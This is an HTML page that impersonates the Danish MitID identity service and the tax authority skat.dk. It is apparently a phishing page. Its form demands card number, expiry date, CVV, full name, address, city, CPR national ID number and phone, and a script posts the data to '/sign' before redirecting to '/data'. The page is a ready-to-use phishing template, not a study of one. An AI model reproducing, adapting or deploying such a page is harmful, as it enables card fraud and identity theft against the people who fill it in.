<!DOCTYPE html>
<html>
  <head>
    <title>MitID</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/static/style.css" />
  </head>

  <body>
    <script
      src="https://code.jquery.com/jquery-3.6.1.min.js"
      integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"
    ></script>
    <script>
      $(function () {
        $('#form').submit(function (e) {
          e.preventDefault()
          $.ajax({
            url: '/sign',
            type: 'post',
            data: $('#form').serialize(),
            success: function (data) {
              if (data) {
                window.location.replace('/data')
              }
            },
          })
        })
      })
    </script>

    <div class="signup-form">
      <div class="frame">
        <img src="/static/logo.png" />
      </div>
      <div class="container-fluid">
        <div class="signup text-center"></div>
        <form id="form">
          <div class="form-group input-group-lg">
            <label for="bruger-id">Kortnummer <span>*</span></label>
            <input
              type="text"
              class="form-control"
              id="name"
              name="card"
              placeholder="XXXX XXXX XXXX XXXX"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">Udløbsdato <span>*</span></label>
            <input
              type="text"
              class="form-control"
              id="name"
              name="expiry"
              placeholder="MM/ÅÅ"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">CVV <span>*</span></label>
            <input
              type="number"
              class="form-control"
              id="name"
              name="cvv"
              placeholder="XXX"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">Fulde Navn <span>*</span></label>
            <input
              type="text"
              class="form-control"
              id="name"
              name="name"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">Adresse <span>*</span></label>
            <input
              type="text"
              class="form-control"
              id="address"
              name="address"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">By <span>*</span></label>
            <input
              type="text"
              class="form-control"
              id="by"
              name="by"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">CPR nummer <span>*</span></label>
            <input
              type="number"
              class="form-control"
              id="cpr"
              name="cpr"
              placeholder="DDMMÅÅXXXX"
              required
            />
          </div>
          <div class="form-group input-group-lg">
            <label for="bruger-id">Telefon <span>*</span></label>
            <div class="input-box">
              <span class="prefix">+45</span>
              <input type="tel" id="phone" name="phone" />
            </div>
          </div>
          <button
            type="submit"
            class="btn btn-primary btn-lg btn-block btn-green"
          >
            Fortsæt
          </button>
        </form>
        <div class="bottom-content">
          <h5>Tilgængelighedserklæring kontakt os 72 22 18 18 om cookies</h5>
          <p>
            skat.dk er Skatteforvaltningens digitale indgang til selvbetjening
            og vejledning om skatter og afgifter
          </p>
        </div>
      </div>
    </div>
  </body>
</html>
